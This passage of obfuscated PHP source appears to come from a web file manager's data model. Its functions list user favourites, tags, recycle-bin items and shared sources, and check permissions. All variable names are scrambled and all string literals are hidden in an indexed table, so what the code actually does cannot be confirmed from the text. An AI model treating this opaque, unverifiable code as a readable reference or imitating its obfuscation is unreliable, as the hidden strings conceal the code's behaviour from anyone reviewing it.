$¡Ÿµ‹À½ .= $½å½ó¬ö[490]; $¡Ÿµ‹À½ .= $½å½ó¬ö[491]; $§ëÉœĞ™ = $½å½ó¬ö[492]; $®…ØÈáê = explode($½å½ó¬ö[50], $§ëÉœĞ™); $‚ãêÂ¨÷ = explode($½å½ó¬ö[50], $¡Ÿµ‹À½); $úÈï°Šö = array(); foreach ($‚ãêÂ¨÷ as $ÕÅÌûÚ€) { if (in_array($ÕÅÌûÚ€, $®…ØÈáê)) { continue; } $úÈï°Šö[] = $ÕÅÌûÚ€; } $İ·¹¯«Œ = explode($½å½ó¬ö[50], $½å½ó¬ö[493]); } foreach ($İ·¹¯«Œ as $Ï¢½€Ûı) { if (isset($õ²ßÓ¯Š[$Ï¢½€Ûı])) { $õ²ßÓ¯Š[$Ï¢½€Ûı] = intval($õ²ßÓ¯Š[$Ï¢½€Ûı]); } } $õ²ßÓ¯Š[$½å½ó¬ö[87]] = $½å½ó¬ö[494] . $õ²ßÓ¯Š[$½å½ó¬ö[194]] . $½å½ó¬ö[495]; $õ²ßÓ¯Š[$½å½ó¬ö[33]] = $õ²ßÓ¯Š[$½å½ó¬ö[496]] == 1 ? $½å½ó¬ö[78] : $½å½ó¬ö[233]; $õ²ßÓ¯Š[$½å½ó¬ö[191]] = $this->typeName($õ²ßÓ¯Š[$½å½ó¬ö[191]]); if ($õ²ßÓ¯Š[$½å½ó¬ö[496]] != 1) { $õ²ßÓ¯Š[$½å½ó¬ö[169]] = $õ²ßÓ¯Š[$½å½ó¬ö[497]]; unset($õ²ßÓ¯Š[$½å½ó¬ö[497]]); } $øİ…† = $‚ãêÂ¨÷; if (isset($õ²ßÓ¯Š[$½å½ó¬ö[498]]) && $õ²ßÓ¯Š[$½å½ó¬ö[498]][$½å½ó¬ö[499]] == -1) { $øİ…† = $úÈï°Šö; } $õ²ßÓ¯Š = array_field_key($õ²ßÓ¯Š, $øİ…†); return $õ²ßÓ¯Š; } public function listUserFav() { $È¾ô¾Ì =& $_SERVER[äô®•½Â]; $®î¦ÍÉŒ = Model($È¾ô¾Ì[500])->listData(); $Ş¬Æä©ò = array_filter_by_field($®î¦ÍÉŒ, $È¾ô¾Ì[33], $È¾ô¾Ì[501]); $Ş¬Æä©ò = array_to_keyvalue($Ş¬Æä©ò, $È¾ô¾Ì[12], $È¾ô¾Ì[87]); if ($Ş¬Æä©ò) { $ÅÖ÷½èÆ = $this->listSource(array($È¾ô¾Ì[502] => array($È¾ô¾Ì[503], $Ş¬Æä©ò))); } $ÅÖ÷½èÆ = array_to_keyvalue($ÅÖ÷½èÆ[$È¾ô¾Ì[456]], $È¾ô¾Ì[194]); foreach ($®î¦ÍÉŒ as &$÷ˆÆüÂ) { $÷ˆÆüÂ = array($È¾ô¾Ì[504] => $÷ˆÆüÂ[$È¾ô¾Ì[486]], $È¾ô¾Ì[505] => $÷ˆÆüÂ[$È¾ô¾Ì[32]], $È¾ô¾Ì[506] => $÷ˆÆüÂ[$È¾ô¾Ì[87]], $È¾ô¾Ì[507] => $÷ˆÆüÂ[$È¾ô¾Ì[33]], $È¾ô¾Ì[508] => $÷ˆÆüÂ[$È¾ô¾Ì[234]], $È¾ô¾Ì[509] => $÷ˆÆüÂ[$È¾ô¾Ì[88]]); if ($÷ˆÆüÂ[$È¾ô¾Ì[33]] == $È¾ô¾Ì[501] && $ÅÖ÷½èÆ[$÷ˆÆüÂ[$È¾ô¾Ì[87]]]) { $÷ˆÆüÂ[$È¾ô¾Ì[90]] = $ÅÖ÷½èÆ[$÷ˆÆüÂ[$È¾ô¾Ì[87]]]; } } unset($÷ˆÆüÂ); return $®î¦ÍÉŒ; } public function listUserTag($şß¯ŒÒ¨) { $ö÷š‹Óê =& $_SERVER[äô®•½Â]; if ($şß¯ŒÒ¨ && !is_array($şß¯ŒÒ¨)) { $şß¯ŒÒ¨ = array($şß¯ŒÒ¨); } $Æë‰ë›¨ = Model($ö÷š‹Óê[510])->listData(); $äŸ—Çó´ = array(); $™‰•Šì· = array(); foreach ($Æë‰ë›¨ as $’®Ù”„) { $Ã²ûÚ¯ = $’®Ù”„[$ö÷š‹Óê[87]]; if (!$Ã²ûÚ¯) { continue; } if (!isset($™‰•Šì·[$Ã²ûÚ¯])) { $™‰•Šì·[$Ã²ûÚ¯] = array(); } $™‰•Šì·[$Ã²ûÚ¯][] = $’®Ù”„[$ö÷š‹Óê[511]]; $äŸ—Çó´[$’®Ù”„[$ö÷š‹Óê[87]]] = $’®Ù”„; } $Ûî…Ç±× = array(); $˜·´×ğå = array(); $ƒ”ëõÙá = array(); foreach ($™‰•Šì· as $ÇŠÁéıò => $è ìŠÄŸ) { $ˆ¾Ÿ¦§ = !0; if (!$şß¯ŒÒ¨) { $Ûî…Ç±×[] = $ÇŠÁéıò; continue; } foreach ($şß¯ŒÒ¨ as $÷ûˆğ—‡) { if (!in_array($÷ûˆğ—‡, $è ìŠÄŸ)) { $ˆ¾Ÿ¦§ = !1; break; } } if (!$ˆ¾Ÿ¦§) { continue; } if (!is_numeric($ÇŠÁéıò)) { $ê¶¡”è = $äŸ—Çó´[$ÇŠÁéıò]; $ÅÂ†´Î = array($ö÷š‹Óê[32] => $ê¶¡”è[$ö÷š‹Óê[32]], $ö÷š‹Óê[87] => $ê¶¡”è[$ö÷š‹Óê[87]], $ö÷š‹Óê[33] => $ê¶¡”è[$ö÷š‹Óê[33]], $ö÷š‹Óê[90] => array($ö÷š‹Óê[512] => 1), $ö÷š‹Óê[235] => !0); if ($ê¶¡”è[$ö÷š‹Óê[33]] == $ö÷š‹Óê[233]) { $ƒ”ëõÙá[] = $ÅÂ†´Î; } if ($ê¶¡”è[$ö÷š‹Óê[33]] == $ö÷š‹Óê[78]) { $˜·´×ğå[] = $ÅÂ†´Î; } continue; } $Ûî…Ç±×[] = $ÇŠÁéıò; } if ($Ûî…Ç±×) { $šçëŠ–‘ = $this->listSource(array($ö÷š‹Óê[502] => array($ö÷š‹Óê[503], $Ûî…Ç±×))); } $šçëŠ–‘ = $šçëŠ–‘ ? $šçëŠ–‘ : array($ö÷š‹Óê[85] => array(), $ö÷š‹Óê[86] => array()); $šçëŠ–‘[$ö÷š‹Óê[85]] = array_merge($šçëŠ–‘[$ö÷š‹Óê[85]], $˜·´×ğå); $šçëŠ–‘[$ö÷š‹Óê[86]] = array_merge($šçëŠ–‘[$ö÷š‹Óê[86]], $ƒ”ëõÙá); if (isset($šçëŠ–‘[$ö÷š‹Óê[453]]) && count($Ûî…Ç±×) == $šçëŠ–‘[$ö÷š‹Óê[453]][$ö÷š‹Óê[454]]) { return $šçëŠ–‘; } $ÂùÖõıü = array(); $ï™ñƒØÂ = array_to_keyvalue($šçëŠ–‘[$ö÷š‹Óê[85]], $ö÷š‹Óê[12], $ö÷š‹Óê[194]); $×’ó®ÏÑ = array_to_keyvalue($šçëŠ–‘[$ö÷š‹Óê[86]], $ö÷š‹Óê[12], $ö÷š‹Óê[194]); $“óŞÍ¨¹ = array_merge($×’ó®ÏÑ, $ï™ñƒØÂ); foreach ($Ûî…Ç±× as $Ã²ûÚ¯) { if (!in_array($Ã²ûÚ¯, $“óŞÍ¨¹)) { $ÂùÖõıü[] = $Ã²ûÚ¯; } } if ($ÂùÖõıü) { Model($ö÷š‹Óê[513])->removeBySource($ÂùÖõıü); } return $šçëŠ–‘; } public function listUserRecycle() { $µİ—¡˜ù =& $_SERVER[äô®•½Â]; $Òê°×£ª = Model($µİ—¡˜ù[514])->listData(); if (!$Òê°×£ª) { return array(); } $øÁ¯Ö´ = array($µİ—¡˜ù[502] => array($µİ—¡˜ù[503], $Òê°×£ª), $µİ—¡˜ù[515] => 1); return $this->listSource($øÁ¯Ö´); } public function listSource($†çüšïæ, $Ñäöù¬ = 3000, $º Øİä = false) { $¢Ø¢óï =& $_SERVER[äô®•½Â]; if (!isset($†çüšïæ[$¢Ø¢óï[516]])) { $†çüšïæ[$¢Ø¢óï[516]] = 0; } if (isset($†çüšïæ[$¢Ø¢óï[193]]) && $†çüšïæ[$¢Ø¢óï[193]] == $¢Ø¢óï[231]) { $†çüšïæ[$¢Ø¢óï[497]] = array($¢Ø¢óï[517], $¢Ø¢óï[12]); } if (isset($†çüšïæ[$¢Ø¢óï[193]])) { $†çüšïæ[$¢Ø¢óï[193]] = intval($†çüšïæ[$¢Ø¢óï[193]]); } $™Õô’‹ = $¢Ø¢óï[518]; $ù²ÈĞÒ¶ = $this->field($™Õô’‹)->_makeOrder()->where($†çüšïæ)->selectPage($Ñäöù¬); $this->_listPageCheck($ù²ÈĞÒ¶, $™Õô’‹, $†çüšïæ); $this->_listDataApply($ù²ÈĞÒ¶[$¢Ø¢óï[456]], $º Øİä); $this->_listMake($ù²ÈĞÒ¶); return $ù²ÈĞÒ¶; } private function _listPageCheck(&$çå¶­, $êˆÀÀô, $Ûã´ô¼) { $’ˆß¨–• =& $_SERVER[äô®•½Â]; if (!is_array($çå¶­[$’ˆß¨–•[453]])) { return; } $«ÍÈøõ… = $çå¶­[$’ˆß¨–•[453]]; if ($«ÍÈøõ…[$’ˆß¨–•[455]] <= 1) { return; } if ($«ÍÈøõ…[$’ˆß¨–•[454]] >= 100000) { return; } if (Model($’ˆß¨–•[519])->get($’ˆß¨–•[520]) != $’ˆß¨–•[521]) { return; } $êˆÀÀô = str_replace(array($’ˆß¨–•[53], $’ˆß¨–•[428], $’ˆß¨–•[288]), $’ˆß¨–•[12], $êˆÀÀô); $êˆÀÀô = $’ˆß¨–•[522] . str_replace($’ˆß¨–•[50], $’ˆß¨–•[523], $êˆÀÀô) . $’ˆß¨–•[524]; $Úß†˜ïé = $’ˆß¨–•[525]; $Úß†˜ïé = $Úß†˜ïé . $’ˆß¨–•[526]; $•¾±ÕæŸ = $«ÍÈøõ…[$’ˆß¨–•[450]] * ($«ÍÈøõ…[$’ˆß¨–•[439]] - 1) . $’ˆß¨–•[50] . $«ÍÈøõ…[$’ˆß¨–•[450]]; $Š‡Û‘ê  = $this->_makeOrder(!0); $ôõùê¼ƒ = $’ˆß¨–•[522] . str_replace($’ˆß¨–•[50], $’ˆß¨–•[523], $Š‡Û‘ê [0]); if (strpos($ôõùê¼ƒ, $’ˆß¨–•[527])) { $ôõùê¼ƒ = str_replace($’ˆß¨–•[527], $’ˆß¨–•[528], $ôõùê¼ƒ); } else { $ôõùê¼ƒ .= $’ˆß¨–•[529] . $Š‡Û‘ê [1]; } $Ç¸–å½ = array(); foreach ($Ûã´ô¼ as $û–÷» => $¥È²¢· ) { $Ç¸–å½[$’ˆß¨–•[522] . $û–÷»] = $¥È²¢· ; } $this->alias($’ˆß¨–•[530])->field($êˆÀÀô)->limit($•¾±ÕæŸ)->order($ôõùê¼ƒ); $¦ÅÄ›ş£ = $this->join($Úß†˜ïé)->where($Ç¸–å½)->select(); if ($¦ÅÄ›ş£) { $çå¶­[$’ˆß¨–•[456]] = $¦ÅÄ›ş£; } } protected function _makeOrder($ºğÍèØÀ = false) { $³±É‰îÕ =& $_SERVER[äô®•½Â]; $¹æªÛàç = Model($³±É‰îÕ[531])->get($³±É‰îÕ[532]); $«±ö­É« = Model($³±É‰îÕ[531])->get($³±É‰îÕ[533]); $ÒöÏÀÏ = array($³±É‰îÕ[534] => $³±É‰îÕ[535], $³±É‰îÕ[536] => $³±É‰îÕ[537]); $¡şÔæ = array($³±É‰îÕ[32] => $³±É‰îÕ[32], $³±É‰îÕ[79] => $³±É‰îÕ[79], $³±É‰îÕ[169] => $³±É‰îÕ[497], $³±É‰îÕ[538] => $³±É‰îÕ[538], $³±É‰îÕ[539] => $³±É‰îÕ[540], $³±É‰îÕ[234] => $³±É‰îÕ[234], $³±É‰îÕ[88] => $³±É‰îÕ[88]); $õ•ÈÖÑ» = Input::get($³±É‰îÕ[541], $³±É‰îÕ[7], $¹æªÛàç, array_keys($¡şÔæ)); $À¯—„àÎ = Input::get($³±É‰îÕ[542], $³±É‰îÕ[7], $«±ö­É«, array_keys($ÒöÏÀÏ)); if (!in_array($õ•ÈÖÑ», array_keys($¡şÔæ))) { $õ•ÈÖÑ» = $³±É‰îÕ[32]; } if (!in_array($À¯—„àÎ, array_keys($ÒöÏÀÏ))) { $õ•ÈÖÑ» = $³±É‰îÕ[534]; } if ($õ•ÈÖÑ» == $³±É‰îÕ[32]) { } $âä˜ïç = $³±É‰îÕ[543] . $¡şÔæ[$õ•ÈÖÑ»] . $³±É‰îÕ[53] . $ÒöÏÀÏ[$À¯—„àÎ]; $âä˜ïç = rtrim(trim($âä˜ïç), $³±É‰îÕ[50]); if ($ºğÍèØÀ) { return array($âä˜ïç, $ÒöÏÀÏ[$À¯—„àÎ]); } return $this->order($âä˜ïç); } protected function _listDataApplyItem($­÷’á°Ø, $¶¿öÂ¨ = false) { $ÈîšÌ¢ = array($­÷’á°Ø); $this->_listDataApply($ÈîšÌ¢, $¶¿öÂ¨); return $ÈîšÌ¢[0]; } protected function _listDataApply(&$Æ©éŞ, $²€ëÑè = false) { $´‘í  =& $_SERVER[äô®•½Â]; if (!$Æ©éŞ) { $Æ©éŞ = array(); return; } $—¥ŸÈ–Ñ = array_to_keyvalue($Æ©éŞ, $´‘í [12], $´‘í [194]); $—¥ŸÈ–Ñ = array_unique($—¥ŸÈ–Ñ); $—¥ŸÈ–Ñ = array_to_int($—¥ŸÈ–Ñ); $this->_listSourceCache($Æ©éŞ); if (!$²€ëÑè) { $this->_listAppendMeta($Æ©éŞ, $—¥ŸÈ–Ñ); $this->_listAppendFileMeta($Æ©éŞ, $—¥ŸÈ–Ñ); $this->_listAppendChildren($Æ©éŞ, $—¥ŸÈ–Ñ); } $this->_listAppendPath($Æ©éŞ); $this->_listAppendAuth($Æ©éŞ); $this->_listAppendSourceInfo($Æ©éŞ, $—¥ŸÈ–Ñ); $this->_listAppendUser($Æ©éŞ); $this->_listFilterInfo($Æ©éŞ, $²€ëÑè); $this->_listAppendAuthSecret($Æ©éŞ); } protected function _listSourceCache($êù“») { $æ†â¹¾­ =& $_SERVER[äô®•½Â]; foreach ($êù“» as $—•æá€ê) { self::$cacheSourceInfo[$æ†â¹¾­[544] . $—•æá€ê[$æ†â¹¾­[194]]] = $—•æá€ê; } } protected function _listFilterInfo(&$’ñˆ”œ–, $ğ¬³»É‹ = false) { $„ò¹Çå‚ =& $_SERVER[äô®•½Â]; foreach ($’ñˆ”œ– as &$«ºÜ©—ğ) { $«ºÜ©—ğ = $this->pathInfoFilter($«ºÜ©—ğ); self::$cachePathInfo[$„ò¹Çå‚[545] . intval($ğ¬³»É‹) . $„ò¹Çå‚[473] . $«ºÜ©—ğ[$„ò¹Çå‚[194]]] = $«ºÜ©—ğ; } unset($«ºÜ©—ğ); } protected function _listMake(&$ì¯È¥÷) { $¤ÂÛŠ› =& $_SERVER[äô®•½Â]; $ì¯È¥÷[$¤ÂÛŠ›[85]] = array(); $ì¯È¥÷[$¤ÂÛŠ›[86]] = array(); foreach ($ì¯È¥÷[$¤ÂÛŠ›[456]] as $÷á†ï“) { $™¡›ùË³ = $÷á†ï“[$¤ÂÛŠ›[496]] == 1 ? $¤ÂÛŠ›[85] : $¤ÂÛŠ›[86]; $ì¯È¥÷[$™¡›ùË³][] = $÷á†ï“; } unset($ì¯È¥÷[$¤ÂÛŠ›[456]]); } protected function _listAppendMeta(&$ˆøŞ¥äÊ, $¾Óı•Àõ) { $áé˜âºà =& $_SERVER[äô®•½Â]; $İ­ÈúÙ‘ = array($áé˜âºà[502] => array($áé˜âºà[503], $¾Óı•Àõ)); $ÇÙÏœÑå = Model($áé˜âºà[546])->field($áé˜âºà[547])->where($İ­ÈúÙ‘)->select(); if (!$ÇÙÏœÑå) { return; } $ªÅš›¨© = array($áé˜âºà[548], $áé˜âºà[549], $áé˜âºà[528]); $½ çö‹ö = array(); foreach ($ÇÙÏœÑå as $ç«š¬øÒ) { if (!isset($½ çö‹ö[$ç«š¬øÒ[$áé˜âºà[194]]])) { $½ çö‹ö[$ç«š¬øÒ[$áé˜âºà[194]]] = array(); } if (in_array($ç«š¬øÒ[$áé˜âºà[97]], $ªÅš›¨©)) { continue; } if ($ç«š¬øÒ[$áé˜âºà[97]] == $áé˜âºà[550]) { $ç«š¬øÒ[$áé˜âºà[461]] = $áé˜âºà[551]; } $½ çö‹ö[$ç«š¬øÒ[$áé˜âºà[194]]][$ç«š¬øÒ[$áé˜âºà[97]]] = $ç«š¬øÒ[$áé˜âºà[461]]; } foreach ($ˆøŞ¥äÊ as &$¤§Î•¸‰) { $¤§Î•¸‰[$áé˜âºà[552]] = !1; if (isset($½ çö‹ö[$¤§Î•¸‰[$áé˜âºà[194]]])) { $¤§Î•¸‰[$áé˜âºà[552]] = $½ çö‹ö[$¤§Î•¸‰[$áé˜âºà[194]]]; } if ($this->fileIsLock($¤§Î•¸‰) && $¤§Î•¸‰[$áé˜âºà[498]]) { $â‹ğ—Ñ­ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $¤§Î•¸‰[$áé˜âºà[498]][$áé˜âºà[499]] = AuthModel::authDisable($¤§Î•¸‰[$áé˜âºà[498]][$áé˜âºà[499]], $â‹ğ—Ñ­); $¤§Î•¸‰[$áé˜âºà[498]][$áé˜âºà[553]][$áé˜âºà[498]] = $¤§Î•¸‰[$áé˜âºà[498]][$áé˜âºà[499]]; } } unset($¤§Î•¸‰); } protected function _listAppendFileMeta(&$¡”‘ìúÔ, $Ş«´ÙÒ”) { $§ÊãÜŞš =& $_SERVER[äô®•½Â]; $’ÔÃì¹Õ = array_to_keyvalue($¡”‘ìúÔ, $§ÊãÜŞš[12], $§ÊãÜŞš[554]); $’ÔÃì¹Õ = array_filter(array_unique($’ÔÃì¹Õ)); $’ÔÃì¹Õ = array_to_int($’ÔÃì¹Õ); if (!$’ÔÃì¹Õ) { return; } $€’¢ÙÖ = array($§ÊãÜŞš[555] => array($§ÊãÜŞš[503], $’ÔÃì¹Õ)); $œø ¾ú = $§ÊãÜŞš[556]; $¹İ›Â¾‰ = Model($§ÊãÜŞš[557])->field($œø ¾ú)->where($€’¢ÙÖ)->select(); $¹İ›Â¾‰ = array_to_keyvalue($¹İ›Â¾‰, $§ÊãÜŞš[554]); $ƒĞ–¥¬ = Model($§ÊãÜŞš[558])->field($§ÊãÜŞš[559])->where($€’¢ÙÖ)->select(); $ƒĞ–¥¬ = $ƒĞ–¥¬ ? $ƒĞ–¥¬ : array(); $õŞëğûµ = array(); foreach ($ƒĞ–¥¬ as $ö§ûÈ–ª) { if (!isset($õŞëğûµ[$ö§ûÈ–ª[$§ÊãÜŞš[554]]])) { $õŞëğûµ[$ö§ûÈ–ª[$§ÊãÜŞš[554]]] = array(); } $õŞëğûµ[$ö§ûÈ–ª[$§ÊãÜŞš[554]]][$ö§ûÈ–ª[$§ÊãÜŞš[97]]] = $ö§ûÈ–ª[$§ÊãÜŞš[461]]; } foreach ($¡”‘ìúÔ as &$šœ±™Ø) { $ùøå×¦ = $šœ±™Ø[$§ÊãÜŞš[554]]; if (!$ùøå×¦ || !is_array($¹İ›Â¾‰[$ùøå×¦])) { continue; } $ìøÇ©ş = $¹İ›Â¾‰[$ùøå×¦]; $ìøÇ©ş[$§ÊãÜŞš[79]] = $šœ±™Ø[$§ÊãÜŞš[79]]; $ìøÇ©ş[$§ÊãÜŞš[32]] = $šœ±™Ø[$§ÊãÜŞš[32]]; if (!$ìøÇ©ş[$§ÊãÜŞš[560]]) { Model($§ÊãÜŞš[557])->fileMd5Check($ìøÇ©ş); } if (!isset(self::$cacheFileInfo[$§ÊãÜŞš[561] . $ùøå×¦])) { self::$cacheFileInfo[$§ÊãÜŞš[561] . $ùøå×¦] = array_merge(array(), $ìøÇ©ş); } unset($¹İ›Â¾‰[$ùøå×¦][$§ÊãÜŞš[87]]); $†±ÛŸ = isset($õŞëğûµ[$ùøå×¦]) && is_array($õŞëğûµ[$ùøå×¦]) ? $õŞëğûµ[$ùøå×¦] : array(); $šœ±™Ø[$§ÊãÜŞš[170]] = array_merge($†±ÛŸ, $¹İ›Â¾‰[$ùøå×¦]); if (isset($šœ±™Ø[$§ÊãÜŞš[170]][$§ÊãÜŞš[185]])) { $šœ±™Ø[$§ÊãÜŞš[185]] = json_decode($šœ±™Ø[$§ÊãÜŞš[170]][$§ÊãÜŞš[185]], !0); unset($šœ±™Ø[$§ÊãÜŞš[170]][$§ÊãÜŞš[185]]); } } unset($šœ±™Ø); } protected function _listAppendSourceInfo(&$Ú–›, $ Òğûà²) { $ÉÚ˜æºë =& $_SERVER[äô®•½Â]; $ÏØü¯°ú = Model($ÉÚ˜æºë[562])->listData(); $£‚¼øğµ = Model($ÉÚ˜æºë[510])->listData(); $–‡§­­ = Model($ÉÚ˜æºë[500])->listData(); $ç­ÄŸú‹ = Model($ÉÚ˜æºë[563])->listSimple(); $ˆ†–­ŒÒ = array_to_keyvalue($ÏØü¯°ú, $ÉÚ˜æºë[486]); $Ù‹’‚ Ó = array_to_keyvalue_group($£‚¼øğµ, $ÉÚ˜æºë[87], $ÉÚ˜æºë[511]); $”ØÆ¥– = array_to_keyvalue($–‡§­­, $ÉÚ˜æºë[87]); $ïÄ›ú÷³ = array_to_keyvalue_group($ç­ÄŸú‹, $ÉÚ˜æºë[194]); foreach ($Ú–› as &$ô¼ÃÓ«) { $ô¼ÃÓ«[$ÉÚ˜æºë[90]] = array($ÉÚ˜æºë[564] => 0, $ÉÚ˜æºë[565] => 0, $ÉÚ˜æºë[566] => 0); if (isset($”ØÆ¥–[$ô¼ÃÓ«[$ÉÚ˜æºë[194]]])) { $ô¼ÃÓ«[$ÉÚ˜æºë[90]][$ÉÚ˜æºë[567]] = 1; $ô¼ÃÓ«[$ÉÚ˜æºë[90]][$ÉÚ˜æºë[568]] = $”ØÆ¥–[$ô¼ÃÓ«[$ÉÚ˜æºë[194]]][$ÉÚ˜æºë[32]]; } if ($Ù‹’‚ Ó && $ˆ†–­ŒÒ && isset($Ù‹’‚ Ó[$ô¼ÃÓ«[$ÉÚ˜æºë[194]]])) { $ô¼ÃÓ«[$ÉÚ˜æºë[90]][$ÉÚ˜æºë[569]] = array(); foreach ($Ù‹’‚ Ó[$ô¼ÃÓ«[$ÉÚ˜æºë[194]]] as $ÜİäõèĞ) { $·¾æïŒ¬ = $ˆ†–­ŒÒ[$ÜİäõèĞ]; $ô¼ÃÓ«[$ÉÚ˜æºë[90]][$ÉÚ˜æºë[569]][] = array($ÉÚ˜æºë[570] => $·¾æïŒ¬[$ÉÚ˜æºë[486]], $ÉÚ˜æºë[505] => $·¾æïŒ¬[$ÉÚ˜æºë[32]], $ÉÚ˜æºë[571] => $·¾æïŒ¬[$ÉÚ˜æºë[572]]); } } if ($ïÄ›ú÷³ && isset($ïÄ›ú÷³[$ô¼ÃÓ«[$ÉÚ˜æºë[194]]])) { $ô¼ÃÓ«[$ÉÚ˜æºë[90]][$ÉÚ˜æºë[573]] = array(); foreach ($ïÄ›ú÷³[$ô¼ÃÓ«[$ÉÚ˜æºë[194]]] as $‰Ÿøòá) { $¨†ÌÜ© = $ÉÚ˜æºë[574]; if ($‰Ÿøòá[$ÉÚ˜æºë[575]] == $ÉÚ˜æºë[91]) { $¨†ÌÜ© .= $ÉÚ˜æºë[576]; } $ô¼ÃÓ«[$ÉÚ˜æºë[90]][$ÉÚ˜æºë[573]] = array_field_key($‰Ÿøòá, explode($ÉÚ˜æºë[50], $¨†ÌÜ©)); } } } unset($ô¼ÃÓ«); return $Ú–›; } protected function _listAppendChildren(&$µæï††, $†×ãÅŸ¢) { $·›øË‘ò =& $_SERVER[äô®•½Â]; $Ì“ˆØÉ· = array(); $¦‡ÁÖ€ = array($·›øË‘ò[242] => 0, $·›øË‘ò[243] => 0); foreach ($µæï†† as &$Û™¯Ã“) { if (!$Û™¯Ã“[$·›øË‘ò[496]]) { continue; } $Ì“ˆØÉ·[] = intval($Û™¯Ã“[$·›øË‘ò[194]]); } unset($Û™¯Ã“); if (!$Ì“ˆØÉ·) { return; } $Ä¡»å® = array($·›øË‘ò[193] => array($·›øË‘ò[7], $Ì“ˆØÉ·), $·›øË‘ò[516] => 0); $Å§ò‡ÔÃ = array($·›øË‘ò[193], $·›øË‘ò[496], $·›øË‘ò[577] => $·›øË‘ò[578]); $Ôêë³×ğ = $this->field($Å§ò‡ÔÃ)->where($Ä¡»å®)->group($·›øË‘ò[579])->select(); $û€¼ùµÖ = array(); foreach ($Ôêë³×ğ as $†™ğ›à) { $ü”‹•Ï­ = $†™ğ›à[$·›øË‘ò[193]]; $¼Ÿ—¡“Ò = $†™ğ›à[$·›øË‘ò[496]] == $·›øË‘ò[91] ? $·›øË‘ò[243] : $·›øË‘ò[242]; if (!isset($û€¼ùµÖ[$ü”‹•Ï­])) { $û€¼ùµÖ[$ü”‹•Ï­] = array($·›øË‘ò[242] => 0, $·›øË‘ò[243] => 0); } $û€¼ùµÖ[$ü”‹•Ï­][$¼Ÿ—¡“Ò] += $†™ğ›à[$·›øË‘ò[578]]; } foreach ($µæï†† as &$Û™¯Ã“) { if (!$Û™¯Ã“[$·›øË‘ò[496]]) { continue; } $½œ´û¸ú = is_array($û€¼ùµÖ[$Û™¯Ã“[$·›øË‘ò[194]]]) ? $û€¼ùµÖ[$Û™¯Ã“[$·›øË‘ò[194]]] : $¦‡ÁÖ€; $Û™¯Ã“[$·›øË‘ò[243]] = $½œ´û¸ú[$·›øË‘ò[243]]; $Û™¯Ã“[$·›øË‘ò[242]] = $½œ´û¸ú[$·›øË‘ò[242]]; unset($Û™¯Ã“[$·›øË‘ò[497]]); } unset($Û™¯Ã“); } protected function _listAppendAuth(&$ãóãí·ª) { $÷“÷ãÂá =& $_SERVER[äô®•½Â]; $âÈ¸óÛÒ = array(); foreach ($ãóãí·ª as $®š¶ã‹») { if ($®š¶ã‹»[$÷“÷ãÂá[191]] == self::TYPE_GROUP) { $âÈ¸óÛÒ[] = intval($®š¶ã‹»[$÷“÷ãÂá[194]]); } } if (!$âÈ¸óÛÒ) { return; } $ƒØäÁøç = array_to_keyvalue($ãóãí·ª, $÷“÷ãÂá[194]); $·Ö’Äî = Model($÷“÷ãÂá[580])->getSourceList($âÈ¸óÛÒ, $ƒØäÁøç); $Ø˜ÎŸŒ€ = KodUser::isRoot(); foreach ($ãóãí·ª as $üº£‡± => &$®š¶ã‹») { $®š¶ã‹»[$÷“÷ãÂá[498]] = $·Ö’Äî[$®š¶ã‹»[$÷“÷ãÂá[194]]]; if (!$®š¶ã‹»[$÷“÷ãÂá[498]] && $®š¶ã‹»[$÷“÷ãÂá[191]] == self::TYPE_GROUP) { $®š¶ã‹»[$÷“÷ãÂá[498]] = Action($÷“÷ãÂá[581])->pathGroupAuthMake($®š¶ã‹»[$÷“÷ãÂá[582]]); if (!$®š¶ã‹»[$÷“÷ãÂá[498]] && !$Ø˜ÎŸŒ€) { $®š¶ã‹»[$÷“÷ãÂá[236]] = !1; $®š¶ã‹»[$÷“÷ãÂá[235]] = !1; } } if ($®š¶ã‹»[$÷“÷ãÂá[498]]) { $®š¶ã‹»[$÷“÷ãÂá[236]] = AuthModel::authCheckEdit($®š¶ã‹»[$÷“÷ãÂá[498]][$÷“÷ãÂá[499]]); $®š¶ã‹»[$÷“÷ãÂá[235]] = AuthModel::authCheckView($®š¶ã‹»[$÷“÷ãÂá[498]][$÷“÷ãÂá[499]]); } $this->groupPathDisplay($®š¶ã‹»); } unset($®š¶ã‹»); } public function _listAppendAuthSecret(&$Æ›ÔÛÇÚ) { $óû›Ü–° =& $_SERVER[äô®•½Â]; if (Model($óû›Ü–°[519])->get($óû›Ü–°[583]) != $óû›Ü–°[91]) { return; } static $ˆá¤ÃÃõ = false; if (!$ˆá¤ÃÃõ) { $õ¾¼ñÍÊ = Model($óû›Ü–°[584]); $â˜Ÿ¤ò = Model($óû›Ü–°[585]); $ˆá¤ÃÃõ = $â˜Ÿ¤ò->listData(); $ˆá¤ÃÃõ = array_to_keyvalue($ˆá¤ÃÃõ, $óû›Ü–°[194]); $Æ«˜ˆÉÏ = json_decode(Model($óû›Ü–°[519])->get($óû›Ü–°[586]), !0); $Æ«˜ˆÉÏ = array_to_keyvalue($Æ«˜ˆÉÏ, $óû›Ü–°[486]); foreach ($ˆá¤ÃÃõ as $‹Ñ·ıí’ => $¯·¸ßÕ£) { $üÉ³”úõ = $Æ«˜ˆÉÏ[$¯·¸ßÕ£[$óû›Ü–°[587]]]; if (!$üÉ³”úõ) { $â˜Ÿ¤ò->remove($¯·¸ßÕ£[$óû›Ü–°[486]]); unset($ˆá¤ÃÃõ[$‹Ñ·ıí’]); continue; } $¾ïÍ…úó = $õ¾¼ñÍÊ->listData($üÉ³”úõ[$óû›Ü–°[498]]); if (!$¾ïÍ…úó) { $â˜Ÿ¤ò->remove($¯·¸ßÕ£[$óû›Ü–°[486]]); unset($ˆá¤ÃÃõ[$‹Ñ·ıí’]); continue; } $¯·¸ßÕ£[$óû›Ü–°[498]] = $¾ïÍ…úó; $¯·¸ßÕ£[$óû›Ü–°[588]] = $üÉ³”úõ; $¯·¸ßÕ£[$óû›Ü–°[589]] = Model($óû›Ü–°[590])->getInfoSimpleOuter($¯·¸ßÕ£[$óû›Ü–°[538]]); $ˆá¤ÃÃõ[$‹Ñ·ıí’] = $¯·¸ßÕ£; } } $äÊö¬ÑÁ = USER_ID; $öúëÆ§ = array(); $´¿„Ë¯à = $this->_listAppendPath($öúëÆ§, !0); foreach ($Æ›ÔÛÇÚ as $‹Ñ·ıí’ => &$¯·¸ßÕ£) { if (!is_array($¯·¸ßÕ£[$óû›Ü–°[498]])) { continue; } if ($¯·¸ßÕ£[$óû›Ü–°[191]] != $óû›Ü–°[591]) { continue; } if 